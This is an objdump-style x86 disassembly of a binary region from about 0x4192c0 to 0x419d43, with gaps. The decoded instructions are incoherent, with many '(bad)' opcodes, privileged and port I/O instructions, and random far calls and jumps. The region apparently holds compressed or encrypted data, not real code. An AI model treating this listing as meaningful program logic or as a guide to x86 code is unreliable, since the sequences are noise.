  4192c0:	sbb    dl,BYTE PTR [esi+0x413d9366]
  4192c6:	dec    esp
  4192c7:	mov    dh,0x4c
  4192c9:	jno    0x41927b
  4192cb:	fs inc eax
  4192cd:	pop    ss
  4192ce:	sahf   
  4192cf:	cli    
  4192d0:	fwait
  4192d1:	inc    esp
  4192d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d3:	retf   0xfa42
  4192d6:	jbe    0x4192b8
  4192d8:	lea    edx,[edx]
  4192da:	ds out 0xe2,al
  4192dd:	cmp    eax,0x48bdc7ba
  4192e2:	sahf   
  4192e3:	sub    eax,0xdfef5a49
  4192e8:	leave  
  4192e9:	adc    edi,DWORD PTR [ebp+0x36]
  4192ec:	add    edx,DWORD PTR [esi]
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	push   esi
  419363:	dec    ebp
  419364:	test   DWORD PTR [ecx+0x67],eax
  419367:	sgdtd  [eax]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	aaa    
  41936f:	pop    ecx
  419370:	jno    0x419303
  419372:	dec    ecx
  419373:	mov    ch,0x34
  419375:	fwait
  419376:	adc    al,BYTE PTR ds:0x20056e95
  41937c:	mov    eax,0xa15eb83e
  419381:	scas   al,BYTE PTR es:[edi]
  419382:	jo     0x419336
  419384:	inc    ebx
  419385:	xor    bh,BYTE PTR [ebx]
  419387:	test   dh,0xf7
  41938a:	lahf   
  41938b:	sub    ecx,DWORD PTR [ebp+0x6b]
  41938e:	call   0xa7de:0x5c8a
  419394:	(bad)  
  419395:	(bad)  
  419396:	out    0xbe,eax
  419398:	std    
  419399:	add    eax,0xccd72325
  41939e:	in     al,0x4
  4193a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a1:	mov    ch,0x53
  4193a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a4:	inc    ebx
  4193a5:	inc    esp
  4193a6:	dec    ebx
  4193a7:	xchg   esp,eax
  4193a8:	lods   al,BYTE PTR ds:[esi]
  4193a9:	mov    ch,0xbf
  4193ab:	add    eax,0x1c9b60e2
  4193b0:	sar    DWORD PTR [esp+eiz*2+0x32],cl
  4193b4:	sub    ax,0x923a
  4193b8:	push   edi
  4193b9:	not    DWORD PTR [edx-0x42]
  4193bc:	cmp    DWORD PTR [eax-0x114eb67],ebp
  4193c2:	dec    ebx
  4193c3:	in     al,dx
  4193c4:	inc    ebp
  4193c5:	push   es
  4193c6:	test   eax,0xc825f7b3
  4193cb:	pop    edi
  4193cc:	push   0xd0a6aace
  4193d1:	push   0x17
  4193d3:	adc    DWORD PTR [ebp-0x3b],esp
  4193d6:	ficomp WORD PTR [ebx+0x26c86ccb]
  4193dc:	inc    eax
  4193dd:	mov    eax,ds:0xa24bbe9b
  4193e2:	jle    0x419367
  4193e4:	push   eax
  4193e5:	ror    DWORD PTR [edx+0x69dbf99a],cl
  4193eb:	fidiv  WORD PTR [eax+0x55]
  4193ee:	int    0x85
  4193f0:	daa    
  4193f1:	jp     0x4193e4
  4193f3:	scas   eax,DWORD PTR es:[edi]
  4193f4:	js     0x4193dc
  4193f6:	daa    
  4193f7:	jmp    0xbf095269
  4193fc:	xor    eax,ecx
  4193fe:	mov    eax,ds:0xdd1ae726
  419403:	inc    ebx
  419404:	and    bl,BYTE PTR [ecx-0x1b6b1e84]
  41940a:	push   0xff769827
  41940f:	mov    ebp,0xe597c40e
  419414:	scas   eax,DWORD PTR es:[edi]
  419415:	mov    ebx,0x72cb5b42
  41941a:	mov    ebx,0xa4fb27c5
  41941f:	and    edx,DWORD PTR [edx]
  419421:	push   0x5b
  419423:	push   edi
  419424:	or     bl,BYTE PTR [eax-0x3fee1e2a]
  41942a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41942b:	in     eax,0x1f
  41942d:	mov    dl,0x8c
  41942f:	inc    esi
  419430:	mov    al,0xd7
  419432:	arpl   WORD PTR [edx+0x4cc82495],di
  419438:	out    0x9e,al
  41943a:	mov    dh,0x1c
  41943c:	popa   
  41943d:	aam    0x18
  41943f:	or     DWORD PTR [edi+0x37a0213a],esi
  419445:	jg     0x419447
  419447:	ja     0x41941d
  419449:	jo     0x419482
  41944b:	push   ss
  41944c:	nop
  41944d:	sti    
  41944e:	aaa    
  41944f:	push   0x4f61cab9
  419454:	mov    bl,0xb4
  419456:	pop    ebx
  419457:	js     0x4194c1
  419459:	or     eax,0x97de13b6
  41945e:	test   DWORD PTR [edx-0x6c29631a],esp
  419464:	cmp    BYTE PTR [ecx-0x7c],0xae
  419468:	in     eax,0x4d
  41946a:	push   0xfb8fca
	...
  4194d3:	add    BYTE PTR [eax],al
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	push   ebx
  4194e3:	rol    BYTE PTR [eax-0x2a],cl
  4194e6:	adc    BYTE PTR [bx+di],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    cl,cl
  4194ef:	and    bl,BYTE PTR [ebp-0x3c71ca4a]
  4194f5:	push   ds
  4194f6:	aaa    
  4194f7:	xchg   edi,eax
  4194f8:	pop    eax
  4194f9:	xor    ebx,ebx
  4194fb:	push   0x33
  4194fd:	dec    edi
  4194fe:	or     bh,BYTE PTR [esi-0x2c525542]
  419504:	mov    dh,0xc4
  419506:	push   es
  419507:	add    eax,0x78e0340e
  41950c:	(bad)  
  41950e:	ror    BYTE PTR [ecx-0x74560c4b],0xc9
  419515:	fsubp  st(3),st
  419517:	xchg   esi,eax
  419518:	adc    al,BYTE PTR [ebp-0x350d7c9d]
  41951e:	mov    bh,0x32
  419520:	push   ecx
  419521:	mov    ebp,0xea79600d
  419526:	pop    esi
  419527:	adc    DWORD PTR [esi+0x5b],edi
  41952a:	jae    0x419513
  41952c:	(bad)  
  41952d:	dec    ebp
  41952e:	shl    BYTE PTR [edx],cl
  419530:	gs push 0xda842164
  419536:	cmp    eax,0xddd1186f
  41953b:	out    dx,eax
  41953c:	mov    al,ds:0xa7afb1aa
  419541:	dec    ecx
  419542:	test   BYTE PTR [eax],0xcd
  419545:	mov    bh,0xd4
  419547:	push   ebp
  419548:	or     ebx,DWORD PTR [eax+0x2264c8a6]
  41954e:	pushf  
  41954f:	sbb    BYTE PTR [edi+0x6f23c74b],bh
  419555:	xchg   dl,bh
  419557:	imul   esp,edx,0xffffffc2
  41955a:	repz popa 
  41955c:	inc    eax
  41955d:	and    ebx,DWORD PTR [edx-0x4f]
  419560:	daa    
  419561:	test   al,0x92
  419563:	jns    0x419522
  419565:	cmp    BYTE PTR [edx-0x40],bh
  419568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419569:	lea    edi,[ebp+0x71]
  41956c:	inc    ebp
  41956d:	loop   0x419598
  41956f:	sbb    ah,dh
  419571:	sbb    al,0xe0
  419573:	push   ebx
  419574:	fdivp  st(1),st
  419576:	je     0x419571
  419578:	jae    0x4195e4
  41957a:	xor    DWORD PTR [edx+edi*2+0x52f21e9c],0x73d055f5
  419585:	in     eax,dx
  419586:	mov    esi,0xada2b2bf
  41958b:	in     eax,dx
  41958c:	xchg   ebp,eax
  41958d:	mov    cs,WORD PTR [eax-0x33]
  419590:	call   0x474d:0xe7c04838
  419597:	cmp    al,0x3a
  419599:	push   ebx
  41959a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41959b:	mov    al,ds:0x5bd04303
  4195a0:	and    BYTE PTR [ecx],0x41
  4195a3:	mov    esi,0x33913d97
  4195a8:	lahf   
  4195a9:	rcl    edx,1
  4195ab:	push   eax
  4195ac:	jo     0x41953f
  4195ae:	xchg   esi,eax
  4195af:	xor    DWORD PTR [edi],ebp
  4195b1:	and    eax,0x431c6ec1
  4195b6:	push   es
  4195b7:	mov    ebx,0xa571ef7e
  4195bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195bd:	xchg   ebx,eax
  4195be:	lods   eax,DWORD PTR ds:[esi]
  4195bf:	pop    ebp
  4195c0:	push   ebp
  4195c1:	or     ebx,ecx
  4195c3:	out    0x35,eax
  4195c5:	shl    esp,0x2a
  4195c8:	retf   0xf6eb
  4195cb:	repnz rcr DWORD PTR [ecx+0x42088a16],0x32
  4195d3:	xchg   ecx,eax
  4195d4:	das    
  4195d5:	out    0x48,al
  4195d7:	iret   
  4195d8:	mov    dh,BYTE PTR [edi-0x56]
  4195db:	adc    bl,BYTE PTR [edx-0x56]
  4195de:	or     BYTE PTR [eax+eax*8-0x6f],dh
  4195e2:	mov    eax,ds:0xbc2b1b87
  4195e7:	inc    ebp
  4195e8:	sub    BYTE PTR [edi+eiz*8-0x31],dh
  4195ec:	mov    ebp,0xcd
	...
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	cld    
  419663:	fs dec ebp
  419665:	push   edi
  419666:	adc    DWORD PTR [bx+di],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [eax-0x304d6096],al
  419673:	xchg   edi,eax
  419674:	add    BYTE PTR [edx],cl
  419676:	mov    al,0x3c
  419678:	and    DWORD PTR [esi+ebx*2],0x3cf7d960
  41967f:	inc    ebx
  419680:	push   cs
  419681:	xor    al,0xa5
  419683:	xchg   esp,eax
  419684:	xor    bl,BYTE PTR [ebp-0x1d1c0ae0]
  41968a:	stos   BYTE PTR es:[edi],al
  41968b:	or     eax,0xdd4dbdc2
  419690:	xor    DWORD PTR [edi-0x43],0xffffff8c
  419694:	add    esp,DWORD PTR [ebx+0x5e]
  419697:	lahf   
  419698:	xlat   BYTE PTR ds:[ebx]
  419699:	mov    edi,0x76927a61
  41969e:	xor    eax,DWORD PTR [edi+eiz*8+0x21e20a96]
  4196a5:	test   DWORD PTR [edx-0x53],ebx
  4196a8:	mov    al,ds:0xd61a5c91
  4196ad:	fistp  WORD PTR [edx+0x61328a56]
  4196b3:	iret   
  4196b4:	das    
  4196b5:	jmp    0x82057dc2
  4196ba:	adc    ch,BYTE PTR [edi+0x2959673b]
  4196c0:	jl     0x4196f8
  4196c2:	cmp    cl,BYTE PTR [edi-0x3d]
  4196c5:	int3   
  4196c6:	into   
  4196c7:	jns    0x419666
  4196c9:	or     esi,esi
  4196cb:	aad    0x55
  4196cd:	scas   al,BYTE PTR es:[edi]
  4196ce:	sub    al,0x79
  4196d1:	lock (bad) 
  4196d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d4:	es in  al,0x46
  4196d7:	sbb    al,BYTE PTR [eax+0x2e]
  4196da:	push   cs
  4196db:	xlat   BYTE PTR ds:[ebx]
  4196dc:	mov    ds:0x2ca7d6c9,al
  4196e1:	sbb    al,0x99
  4196e3:	fsubr  st(5),st
  4196e5:	and    BYTE PTR ds:0xd92898bd,bh
  4196eb:	push   ebp
  4196ec:	rcr    esi,0x3f
  4196ef:	ins    BYTE PTR es:[edi],dx
  4196f0:	and    dh,BYTE PTR [edi+esi*2+0x5]
  4196f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196f5:	push   cs
  4196f6:	imul   esp,esp,0xffffff85
  4196f9:	push   edi
  4196fa:	sub    al,0x43
  4196fc:	lds    esp,FWORD PTR [edx]
  4196fe:	out    0xfc,eax
  419700:	imul   ebp,DWORD PTR [ebx+0x24],0x4a41c50f
  419707:	or     al,0x8d
  419709:	adc    dl,BYTE PTR [ebx]
  41970b:	jo     0x4196b5
  41970d:	or     dh,dh
  41970f:	sub    BYTE PTR [ebx+0x20],0xc9
  419713:	inc    ebx
  419714:	mov    dh,0x7e
  419716:	mov    DWORD PTR [esi+eiz*1+0x688edd1],eax
  41971d:	pop    edi
  41971e:	xchg   esi,eax
  41971f:	fisub  WORD PTR [esp+ebp*2]
  419722:	imul   esi,DWORD PTR [ecx*4-0x36915591],0xffffff9c
  41972a:	or     al,0x49
  41972c:	mov    dl,0xce
  41972e:	scas   al,BYTE PTR es:[edi]
  41972f:	push   eax
  419730:	repz addr16 call 0x41009ea6
  419737:	jg     0x419787
  419739:	dec    edx
  41973a:	mov    bh,0x32
  41973c:	xchg   ebp,eax
  41973d:	fwait
  41973e:	enter  0x8a90,0xf0
  419742:	stos   BYTE PTR es:[edi],al
  419743:	sahf   
  419744:	jno    0x419703
  419746:	jnp    0x4196ee
  419748:	sbb    DWORD PTR [ebx],ebp
  41974a:	and    DWORD PTR [ebx],ebp
  41974c:	fdivr  QWORD PTR [ebp+0x6c]
  41974f:	jb     0x41971b
  419751:	ins    BYTE PTR es:[edi],dx
  419752:	mov    ebp,0x3795ea56
  419757:	xor    DWORD PTR [ebx],0x1150bad8
  41975d:	or     dl,BYTE PTR [esi]
  41975f:	(bad)  
  419761:	jmp    DWORD PTR [ecx+ebx*4+0x5b]
  419765:	int    0x48
  419767:	inc    eax
  419768:	popa   
  419769:	or     dh,BYTE PTR [edx-0x13]
  41976c:	inc    edi
  41976d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xa48dd0ae
  4197e3:	retf   0x30b9
  4197e6:	adc    al,BYTE PTR [bx+di]
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    BYTE PTR ds:0x75fa3799,al
  4197f3:	cmp    ebx,DWORD PTR [ebp-0x68]
  4197f6:	xchg   edi,eax
  4197f7:	jle    0x419872
  4197f9:	mov    al,ds:0x67fa8a66
  4197fe:	dec    esp
  4197ff:	lea    ebp,[edi+0x4bd4c221]
  419805:	adc    DWORD PTR [edx],0x11
  419808:	mov    ebx,0xeaf479d9
  41980d:	neg    BYTE PTR [ebp+0x4ad59a56]
  419813:	lock hlt 
  419815:	xchg   ecx,eax
  419816:	and    eax,0x85bec598
  41981b:	fimul  DWORD PTR [edx-0x2b887a62]
  419821:	stc    
  419822:	sti    
  419823:	mov    ch,0xf7
  419825:	loope  0x4197b8
  419827:	in     eax,0x4d
  419829:	dec    edi
  41982a:	jmp    0x41980a
  41982c:	fisub  DWORD PTR [eax-0x54]
  41982f:	add    dh,0x15
  419832:	nop
  419833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419834:	fadd   st,st(4)
  419836:	scas   eax,DWORD PTR es:[edi]
  419837:	icebp  
  419838:	mov    ebp,0x74e5d769
  41983d:	mov    al,ds:0x68a87f79
  419842:	out    0x28,al
  419844:	inc    eax
  419845:	inc    ebx
  419846:	pop    ecx
  419847:	pop    ss
  419848:	loopne 0x419830
  41984a:	and    al,0x26
  41984c:	sub    DWORD PTR [ebp+0x35b3e2e],edi
  419852:	loope  0x41987b
  419854:	add    esi,0x454b376b
  41985a:	mov    al,0x64
  41985c:	retf   0xd54
  41985f:	pop    ebp
  419860:	jnp    0x419898
  419862:	lods   eax,DWORD PTR ds:[esi]
  419863:	clc    
  419864:	push   esp
  419865:	jo     0x41987d
  419867:	into   
  419868:	xlat   BYTE PTR ds:[ebx]
  419869:	repz sbb ebp,DWORD PTR [ecx+0x5e]
  41986d:	sar    DWORD PTR [edx+0xa],1
  419870:	add    eax,0x10e6f806
  419875:	add    ah,BYTE PTR [esi-0x1b]
  419878:	mov    ss,ebx
  41987a:	mov    eax,ds:0x20537446
  41987f:	adc    al,0xd6
  419881:	test   eax,0x99dfa39c
  419886:	das    
  419887:	pop    ecx
  419888:	push   ebx
  419889:	dec    esi
  41988a:	pop    edx
  41988b:	aas    
  41988c:	mov    ebp,DWORD PTR [eax]
  41988e:	sbb    al,cl
  419890:	sbb    esi,0xa7bea1ca
  419896:	inc    ebp
  419897:	cli    
  419898:	jo     0x4198e4
  41989a:	adc    BYTE PTR [edx+0x49c695a7],dl
  4198a0:	xor    eax,0x1fe28441
  4198a5:	push   cs
  4198a6:	loope  0x41984a
  4198a8:	push   edi
  4198a9:	repnz xchg esp,eax
  4198ab:	mov    ds:0x762ccfb0,eax
  4198b0:	cmp    al,0x16
  4198b2:	fisubr WORD PTR [ebx]
  4198b4:	or     ebx,DWORD PTR [edx]
  4198b6:	addr16 pop ecx
  4198b8:	sub    BYTE PTR [ecx-0x7b],dl
  4198bb:	icebp  
  4198bc:	jge    0x4198ff
  4198be:	jle    0x4198d8
  4198c0:	jp     0x4198be
  4198c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c3:	les    esp,FWORD PTR [ebx+0x5c]
  4198c6:	fs hlt 
  4198c8:	daa    
  4198c9:	scas   al,BYTE PTR es:[edi]
  4198ca:	mov    ch,0xf
  4198cc:	jmp    0x4198ab
  4198ce:	jb     0x419938
  4198d0:	scas   eax,DWORD PTR es:[edi]
  4198d1:	std    
  4198d2:	mov    ebp,0xe479275b
  4198d7:	inc    ebp
  4198d8:	retf   
  4198d9:	inc    edx
  4198da:	push   esi
  4198db:	xor    BYTE PTR [esp+edi*4],0x73
  4198df:	sbb    BYTE PTR [ecx],cl
  4198e1:	pusha  
  4198e2:	aam    0x7c
  4198e4:	cmp    BYTE PTR [ebx+eax*4+0x2a],0xcc
  4198e9:	or     eax,0xd3bc40c6
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnsave [ebx+0x671bfac8]
  419967:	adc    eax,DWORD PTR [ecx]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [edx],dl
  41996f:	clc    
  419970:	sbb    DWORD PTR [edi],esi
  419972:	pop    edx
  419973:	jnp    0x41993c
  419975:	das    
  419976:	pop    edi
  419977:	push   eax
  419978:	xor    BYTE PTR [ebx-0x71e0f5cc],ah
  41997e:	scas   al,BYTE PTR es:[edi]
  41997f:	stos   BYTE PTR es:[edi],al
  419980:	(bad)  
  419981:	and    BYTE PTR [edi],bh
  419983:	sub    ebp,DWORD PTR [edx+0x57]
  419986:	push   es
  419987:	push   ds
  419988:	push   es
  419989:	jl     0x4199a5
  41998b:	sub    BYTE PTR [eax+0x66c2040c],bl
  419991:	jmp    FWORD PTR [edx+ecx*1+0x30]
  419995:	pop    ds
  419996:	je     0x4199c9
  419998:	out    0x85,eax
  41999a:	call   0xce5e50ed
  41999f:	out    0xf9,al
  4199a1:	jo     0x4199a2
  4199a3:	push   es
  4199a4:	or     al,0x3c
  4199a6:	into   
  4199a7:	add    eax,0x87203e95
  4199ac:	js     0x419996
  4199ae:	mov    bl,0x72
  4199b0:	adc    eax,0xf3f4fb95
  4199b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199b6:	mov    BYTE PTR [ebp+0x16],ah
  4199b9:	jge    0x419a3a
  4199bb:	cmc    
  4199bc:	mov    cs,WORD PTR ds:0xdb48ef69
  4199c2:	mov    edx,0x1377cd7e
  4199c7:	(bad)  
  4199c8:	mov    cl,0xf0
  4199ca:	sbb    eax,0xe5e2b105
  4199cf:	cmp    DWORD PTR [ecx+0x5af54df6],esp
  4199d5:	gs cmp eax,0x358eadb8
  4199db:	add    DWORD PTR [ecx+0x6378bb8f],esi
  4199e1:	scas   eax,DWORD PTR es:[edi]
  4199e2:	cs in  eax,dx
  4199e4:	xchg   BYTE PTR [ecx-0x21],ch
  4199e7:	add    BYTE PTR gs:[ecx+0x4e93d720],ch
  4199ee:	stos   BYTE PTR es:[edi],al
  4199ef:	sub    ch,BYTE PTR [edi-0x720c49d3]
  4199f5:	ds scas al,BYTE PTR es:[edi]
  4199f7:	pop    ds
  4199f8:	mov    cl,0x9a
  4199fa:	mov    al,0x15
  4199fc:	out    dx,al
  4199fd:	sub    eax,0x8c3251a4
  419a02:	cmp    eax,0x9920721c
  419a07:	push   esi
  419a08:	or     edx,DWORD PTR [eax]
  419a0a:	inc    esi
  419a0b:	mov    esi,edx
  419a0d:	adc    esp,DWORD PTR [esi+0x38b7d846]
  419a13:	iret   
  419a14:	into   
  419a15:	mov    bl,0xc0
  419a17:	aaa    
  419a18:	mov    ds,ecx
  419a1a:	add    BYTE PTR [ebx+0x76],0x3
  419a1e:	cs test eax,0x10c04492
  419a24:	dec    ebp
  419a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a26:	aam    0xc7
  419a28:	and    bh,ch
  419a2a:	xchg   BYTE PTR [ecx+eiz*2-0x6d],ch
  419a2e:	jno    0x4199b1
  419a30:	cs (bad) 
  419a32:	fild   QWORD PTR [eax-0x193f370e]
  419a38:	cmp    ecx,ebx
  419a3a:	xchg   esp,eax
  419a3b:	fisub  WORD PTR [edi-0x49]
  419a3e:	sti    
  419a3f:	dec    ebp
  419a40:	call   0xd695536
  419a45:	adc    DWORD PTR [esi],edx
  419a47:	add    al,0x17
  419a49:	popa   
  419a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a4b:	cmp    bl,bh
  419a4d:	int    0xde
  419a4f:	xlat   BYTE PTR ds:[ebx]
  419a50:	aam    0xb4
  419a52:	pop    ebx
  419a53:	mov    al,ds:0x5ee82b85
  419a58:	xor    ecx,DWORD PTR [ecx]
  419a5a:	adc    eax,0x83e661f0
  419a5f:	fistp  DWORD PTR [eax-0x5f71b092]
  419a65:	sti    
  419a66:	sbb    BYTE PTR ss:[edi],ch
  419a69:	or     eax,0x2081924d
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x8e1784c2,cl
  419ae5:	sbb    esp,DWORD PTR [edi+0x14]
  419ae8:	add    DWORD PTR [eax],eax
  419aea:	add    BYTE PTR [ecx],al
  419aec:	add    BYTE PTR [eax],al
  419aee:	add    dh,BYTE PTR [edx]
  419af0:	cmp    al,0x48
  419af2:	fbstp  TBYTE PTR [edx]
  419af4:	jecxz  0x419ae4
  419af6:	mov    ds:0x37480026,al
  419afb:	es jge 0x419b07
  419afe:	repnz lds eax,FWORD PTR [ebx+ecx*2-0x4c]
  419b03:	je     0x419b74
  419b05:	scas   al,BYTE PTR es:[edi]
  419b06:	test   BYTE PTR [edx],dh
  419b08:	ja     0x419b0a
  419b0a:	adc    cl,BYTE PTR [ecx]
  419b0c:	iret   
  419b0d:	mov    edx,DWORD PTR [edx+ecx*1+0x6]
  419b11:	jno    0x419b2f
  419b13:	fucomi st,st(2)
  419b15:	mov    al,0x89
  419b17:	inc    eax
  419b18:	or     DWORD PTR [eax],esi
  419b1a:	xchg   DWORD PTR ds:0xfbdf386b,esp
  419b20:	jmp    0x8e6ff0dd
  419b25:	cmp    eax,0x27d9312c
  419b2a:	mov    eax,ds:0x11a69411
  419b2f:	pop    esi
  419b30:	call   0x46f436d1
  419b35:	and    edx,DWORD PTR [edi-0x1b]
  419b38:	push   ds
  419b39:	sbb    dh,cl
  419b3b:	mov    ds:0x4462081f,al
  419b40:	jg     0x419b1f
  419b42:	loope  0x419b5e
  419b44:	aaa    
  419b45:	add    eax,DWORD PTR [edi+0x6f616b65]
  419b4b:	test   eax,0x4b1f37e5
  419b50:	xchg   edi,eax
  419b51:	jg     0x419ba9
  419b53:	sbb    al,0xbf
  419b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b56:	hlt    
  419b57:	sub    eax,0xf2747704
  419b5c:	sbb    eax,0x86a0df0a
  419b61:	dec    esp
  419b62:	mov    ds:0x63a0a091,al
  419b67:	dec    ebp
  419b68:	push   ebx
  419b69:	jnp    0x419b7e
  419b6b:	mov    eax,ds:0x1f736ce7
  419b70:	mov    al,ds:0xda24c97e
  419b75:	pop    es
  419b76:	adc    al,0x65
  419b78:	cdq    
  419b79:	fbstp  TBYTE PTR [edi-0x131d74bd]
  419b7f:	and    al,0xde
  419b81:	cmp    BYTE PTR [ebx+edi*1],dh
  419b84:	cmp    esi,eax
  419b86:	mov    ch,0xa0
  419b88:	out    0x9d,al
  419b8a:	push   ebx
  419b8b:	test   al,0xa0
  419b8d:	jl     0x419b45
  419b8f:	leave  
  419b90:	or     ah,BYTE PTR [eax+0x510d976e]
  419b96:	fs out dx,eax
  419b98:	shr    eax,cl
  419b9a:	xor    eax,0x19262bb6
  419b9f:	mov    ds:0x85254ebf,al
  419ba4:	bound  edx,QWORD PTR [ecx+eiz*1]
  419ba7:	adc    al,0xf7
  419ba9:	pop    edi
  419baa:	adc    edi,DWORD PTR [esi]
  419bac:	sbb    edi,DWORD PTR [esi+0x3d]
  419baf:	sub    ebx,esp
  419bb1:	push   eax
  419bb2:	std    
  419bb3:	rcl    esp,0xfe
  419bb6:	xchg   ecx,eax
  419bb7:	xchg   esp,eax
  419bb8:	cmp    eax,0xd87900a9
  419bbd:	dec    ebp
  419bbe:	aad    0xb8
  419bc0:	inc    ebx
  419bc1:	xchg   esi,eax
  419bc2:	call   0xaf4c:0xe8acdf1
  419bc9:	cmp    BYTE PTR [ebp-0x58],dl
  419bcc:	sub    edi,eax
  419bce:	lock add BYTE PTR [ebp-0x19],ch
  419bd2:	cdq    
  419bd3:	and    al,BYTE PTR [edi-0x80]
  419bd6:	lods   al,BYTE PTR ds:[esi]
  419bd7:	or     eax,DWORD PTR [ecx-0x43]
  419bda:	ja     0x419bc5
  419bdc:	mov    dl,BYTE PTR [ebp-0x18]
  419bdf:	packsswb mm1,QWORD PTR [ecx+0x150cc1b0]
  419be6:	ss std 
  419be8:	xchg   DWORD PTR [esi],edx
  419bea:	xchg   ecx,eax
  419beb:	jns    0x419bb8
  419bed:	repz add BYTE PTR [eax],al
	...
  419c54:	add    BYTE PTR [eax],al
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x2f
  419c63:	and    edi,0x32
  419c66:	addr16 adc eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	gs out dx,eax
  419c70:	mov    ah,0x42
  419c72:	test   BYTE PTR [esi-0x2d],0x96
  419c76:	cs jns 0x419c42
  419c79:	inc    ebp
  419c7a:	call   0xe46dc3c2
  419c7f:	sub    eax,0x2024b70f
  419c84:	pop    edi
  419c85:	in     eax,dx
  419c86:	xchg   dh,ch
  419c88:	xchg   ebx,eax
  419c89:	test   eax,0xcc4dacf2
  419c8e:	push   ds
  419c8f:	sbb    DWORD PTR [eax],ebx
  419c91:	ficomp WORD PTR [ebp-0x4418891b]
  419c97:	aaa    
  419c98:	mov    esi,0x16622f87
  419c9d:	mov    BYTE PTR [eax-0x3b96dac9],dl
  419ca3:	adc    eax,ecx
  419ca5:	in     al,0x1f
  419ca7:	int3   
  419ca8:	jo     0x419cb5
  419caa:	lahf   
  419cab:	stos   BYTE PTR es:[edi],al
  419cac:	ss mov dh,0x1d
  419caf:	gs out dx,eax
  419cb1:	call   0x649e:0xd171d05
  419cb8:	xor    ah,BYTE PTR [edx]
  419cba:	(bad)  
  419cbb:	push   eax
  419cbc:	sub    BYTE PTR ds:0x4e198261,0x92
  419cc3:	mov    dh,0x77
  419cc5:	push   esi
  419cc6:	pop    ss
  419cc7:	mov    cs,WORD PTR [esi-0x648739a8]
  419ccd:	sbb    edx,DWORD PTR [esi+0x31]
  419cd0:	jnp    0x419cba
  419cd2:	jne    0x419d38
  419cd4:	dec    ebx
  419cd5:	dec    ecx
  419cd6:	cld    
  419cd7:	sbb    esp,edx
  419cd9:	jbe    0x419d58
  419cdb:	xchg   ebx,eax
  419cdc:	xor    BYTE PTR [edi],bh
  419cde:	hlt    
  419cdf:	imul   esi,DWORD PTR [esi+0x3894db70],0xf1371a31
  419ce9:	mov    ecx,0x90614c78
  419cee:	ds inc eax
  419cf0:	inc    edx
  419cf1:	(bad)  
  419cf2:	adc    bl,BYTE PTR [esi-0x65]
  419cf5:	xor    ecx,eax
  419cf7:	pop    esp
  419cf8:	out    0x8b,al
  419cfa:	lods   al,BYTE PTR ds:[esi]
  419cfb:	aaa    
  419cfc:	daa    
  419cfd:	test   BYTE PTR [edi+0x55],bh
  419d00:	jecxz  0x419cd3
  419d02:	mov    edx,0x6d7a4ebe
  419d07:	adc    BYTE PTR [ebp+0x7],bh
  419d0a:	(bad)  
  419d0b:	mov    ecx,DWORD PTR [esi-0x30d25bc4]
  419d11:	inc    edx
  419d12:	int3   
  419d13:	aad    0xdc
  419d15:	and    esp,edx
  419d17:	icebp  
  419d18:	or     BYTE PTR [ebp+0x32],dh
  419d1b:	aam    0x1d
  419d1d:	push   0x55
  419d1f:	test   al,0x3c
  419d21:	xor    DWORD PTR [edx+0x7e],ecx
  419d24:	push   eax
  419d25:	sub    ebp,DWORD PTR [ecx+0x4a5ab467]
  419d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d2c:	mov    BYTE PTR ds:0x188a6a56,dl
  419d32:	les    ebp,FWORD PTR [ebx-0x38]
  419d35:	loop   0x419d1a
  419d37:	dec    esi
  419d38:	jbe    0x419ce8
  419d3a:	inc    ebx
  419d3b:	out    dx,eax
  419d3c:	push   0xdaffa209
  419d41:	xchg   edx,ebx
  419d43:	loop   0x419d4f
